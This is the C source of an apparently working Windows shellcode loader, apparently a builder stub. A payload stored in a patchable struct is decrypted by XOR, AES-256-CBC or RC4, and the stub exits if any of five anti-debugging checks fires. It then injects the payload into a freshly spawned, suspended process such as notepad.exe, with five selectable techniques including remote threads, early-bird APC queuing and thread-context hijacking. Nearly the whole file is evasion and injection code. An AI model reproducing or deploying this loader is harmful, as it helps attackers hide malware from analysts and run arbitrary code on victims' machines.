#include <windows.h>

#define PAYLOAD_MARKER 0xDEADBEEF
#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256

#define ENC_NONE 0
#define ENC_XOR 1
#define ENC_AES 2
#define ENC_RC4 3

#pragma pack(push, 1)
typedef struct {
	DWORD payload_size;
	unsigned char payload[MAX_PAYLOAD_SIZE];
	unsigned char encryption_method;
	unsigned char xor_key;
	unsigned char aes_key[32];
	unsigned char aes_iv[16];
	unsigned char rc4_key[16];
	unsigned char technique;
	char target_process[MAX_PROCESS_NAME];
	unsigned char check_peb_being_debugged;
	unsigned char check_debug_port;
	unsigned char check_debug_object;
	unsigned char check_hardware_breakpoints;
	unsigned char check_remote_debugger;
} PatchData;
#pragma pack(pop)

PatchData patch_data = {
	PAYLOAD_MARKER,
	{0},
	0,
	0,
	{0},
	{0},
	{0},
	0,
	"notepad.exe",
	0,
	0,
	0,
	0,
	0
};

static unsigned char aes_sbox[256] = {
	0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
	0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
	0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
	0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
	0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
	0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
	0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
	0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
	0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
	0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
	0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
	0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
	0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
	0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
	0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
	0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static unsigned char aes_rsbox[256] = {
	0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
	0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
	0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
	0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
	0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
	0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
	0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
	0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
	0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
	0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
	0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
	0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
	0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
	0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
	0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
	0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
};

static unsigned char aes_rcon[11] = {0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};

static unsigned char gf_mul(unsigned char a, unsigned char b) {
	unsigned char p = 0;
	unsigned char hi;
	int i;
	for (i = 0; i < 8; i++) {
		if (b & 1) p ^= a;
		hi = a & 0x80;
		a <<= 1;
		if (hi) a ^= 0x1b;
		b >>= 1;
	}
	return p;
}

void aes_key_expansion(unsigned char* key, unsigned char* round_keys) {
	int i, j;
	unsigned char temp[4];

	for (i = 0; i < 32; i++) round_keys[i] = key[i];

	for (i = 8; i < 60; i++) {
		for (j = 0; j < 4; j++) temp[j] = round_keys[(i - 1) * 4 + j];

		if (i % 8 == 0) {
			unsigned char t = temp[0];
			temp[0] = aes_sbox[temp[1]] ^ aes_rcon[i / 8];
			temp[1] = aes_sbox[temp[2]];
			temp[2] = aes_sbox[temp[3]];
			temp[3] = aes_sbox[t];
		} else if (i % 8 == 4) {
			for (j = 0; j < 4; j++) temp[j] = aes_sbox[temp[j]];
		}

		for (j = 0; j < 4; j++) round_keys[i * 4 + j] = round_keys[(i - 8) * 4 + j] ^ temp[j];
	}
}

void aes_inv_cipher(unsigned char* state, unsigned char* round_keys) {
	int i, j, round;
	unsigned char temp[16];

	for (i = 0; i < 16; i++) state[i] ^= round_keys[14 * 16 + i];

	for (round = 13; round >= 0; round--) {
		unsigned char t = state[13];
		state[13] = state[9]; state[9] = state[5]; state[5] = state[1]; state[1] = t;
		t = state[2]; state[2] = state[10]; state[10] = t;
		t = state[6]; state[6] = state[14]; state[14] = t;
		t = state[3]; state[3] = state[7]; state[7] = state[11]; state[11] = state[15]; state[15] = t;

		for (i = 0; i < 16; i++) state[i] = aes_rsbox[state[i]];
		for (i = 0; i < 16; i++) state[i] ^= round_keys[round * 16 + i];

		if (round > 0) {
			for (i = 0; i < 4; i++) {
				unsigned char s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
				temp[i*4] = gf_mul(s0,0x0e) ^ gf_mul(s1,0x0b) ^ gf_mul(s2,0x0d) ^ gf_mul(s3,0x09);
				temp[i*4+1] = gf_mul(s0,0x09) ^ gf_mul(s1,0x0e) ^ gf_mul(s2,0x0b) ^ gf_mul(s3,0x0d);
				temp[i*4+2] = gf_mul(s0,0x0d) ^ gf_mul(s1,0x09) ^ gf_mul(s2,0x0e) ^ gf_mul(s3,0x0b);
				temp[i*4+3] = gf_mul(s0,0x0b) ^ gf_mul(s1,0x0d) ^ gf_mul(s2,0x09) ^ gf_mul(s3,0x0e);
			}
			for (i = 0; i < 16; i++) state[i] = temp[i];
		}
	}
}

void decrypt_aes(unsigned char* data, DWORD size, unsigned char* key, unsigned char* iv) {
	unsigned char round_keys[240];
	unsigned char prev_block[16];
	unsigned char cipher_copy[16];
	unsigned char block[16];
	DWORD i, j, num_blocks;

	aes_key_expansion(key, round_keys);
	for (i = 0; i < 16; i++) prev_block[i] = iv[i];

	num_blocks = size / 16;
	for (i = 0; i < num_blocks; i++) {
		for (j = 0; j < 16; j++) cipher_copy[j] = data[i * 16 + j];
		for (j = 0; j < 16; j++) block[j] = data[i * 16 + j];
		aes_inv_cipher(block, round_keys);
		for (j = 0; j < 16; j++) data[i * 16 + j] = block[j] ^ prev_block[j];
		for (j = 0; j < 16; j++) prev_block[j] = cipher_copy[j];
	}
}

void decrypt_rc4(unsigned char* data, DWORD size, unsigned char* key, DWORD key_len) {
	unsigned char S[256];
	DWORD i, j = 0;
	unsigned char temp;

	for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[i % key_len]) % 256;
		temp = S[i]; S[i] = S[j]; S[j] = temp;
	}

	i = 0; j = 0;
	for (DWORD n = 0; n < size; n++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		temp = S[i]; S[i] = S[j]; S[j] = temp;
		data[n] ^= S[(S[i] + S[j]) % 256];
	}
}

BOOL check_peb_debugged() {
	PPEB peb = (PPEB)__readgsqword(0x60);
	return peb->BeingDebugged;
}

BOOL check_debug_port() {
	HANDLE hProcess = GetCurrentProcess();
	DWORD debugPort = 0;
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) return FALSE;

	if (NtQueryInformationProcess(hProcess, 7, &debugPort, sizeof(debugPort), NULL) == 0) {
		return debugPort != 0;
	}
	return FALSE;
}

BOOL check_debug_object() {
	HANDLE hProcess = GetCurrentProcess();
	HANDLE debugObject = NULL;
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) return FALSE;

	if (NtQueryInformationProcess(hProcess, 30, &debugObject, sizeof(debugObject), NULL) == 0) {
		return debugObject != NULL;
	}
	return FALSE;
}

BOOL check_hardware_breakpoints() {
	CONTEXT ctx;
	HANDLE hThread = GetCurrentThread();

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (GetThreadContext(hThread, &ctx)) {
		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
			return TRUE;
		}
	}
	return FALSE;
}

BOOL check_remote_debugger_present() {
	BOOL debuggerPresent = FALSE;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
	return debuggerPresent;
}

BOOL perform_anti_debug_checks() {
	if (patch_data.check_peb_being_debugged && check_peb_debugged()) {
		return TRUE;
	}
	if (patch_data.check_debug_port && check_debug_port()) {
		return TRUE;
	}
	if (patch_data.check_debug_object && check_debug_object()) {
		return TRUE;
	}
	if (patch_data.check_hardware_breakpoints && check_hardware_breakpoints()) {
		return TRUE;
	}
	if (patch_data.check_remote_debugger && check_remote_debugger_present()) {
		return TRUE;
	}
	return FALSE;
}

void decrypt_payload() {
	switch (patch_data.encryption_method) {
	case ENC_XOR:
		if (patch_data.xor_key != 0) {
			DWORD i;
			for (i = 0; i < patch_data.payload_size; i++) {
				patch_data.payload[i] ^= patch_data.xor_key;
			}
		}
		break;
	case ENC_AES:
		decrypt_aes(patch_data.payload, patch_data.payload_size, patch_data.aes_key, patch_data.aes_iv);
		break;
	case ENC_RC4:
		decrypt_rc4(patch_data.payload, patch_data.payload_size, patch_data.rc4_key, 16);
		break;
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	HANDLE hThread;
	DWORD old;
	char cmd[MAX_PROCESS_NAME];

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
	if (!hThread) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}
	CloseHandle(hThread);

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_early_bird_apc() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	DWORD old;
	char cmd[MAX_PROCESS_NAME];

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!QueueUserAPC((PAPCFUNC)buf, pi.hThread, 0)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_thread_hijacking() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	DWORD old;
	CONTEXT ctx;
	char cmd[MAX_PROCESS_NAME];

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(pi.hThread, &ctx)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ctx.Rip = (DWORD64)buf;
	if (!SetThreadContext(pi.hThread, &ctx)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_process_hollowing() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	DWORD old;
	CONTEXT ctx;
	char cmd[MAX_PROCESS_NAME];

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(pi.hThread, &ctx)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ctx.Rip = (DWORD64)buf;
	if (!SetThreadContext(pi.hThread, &ctx)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_remote_mapping() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	HANDLE hThread;
	DWORD old;
	char cmd[MAX_PROCESS_NAME];

	lstrcpyA(cmd, patch_data.target_process);

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
	if (hThread) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_early_bird_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_remote_mapping
};

int main() {
	if (patch_data.payload_size == 0 || patch_data.payload_size == PAYLOAD_MARKER || patch_data.payload_size > MAX_PAYLOAD_SIZE) {
		return 1;
	}

	if (patch_data.technique >= 5) {
		return 1;
	}

	if (perform_anti_debug_checks()) {
		return 1;
	}

	decrypt_payload();
	injection_techniques[patch_data.technique]();
	return 0;
}
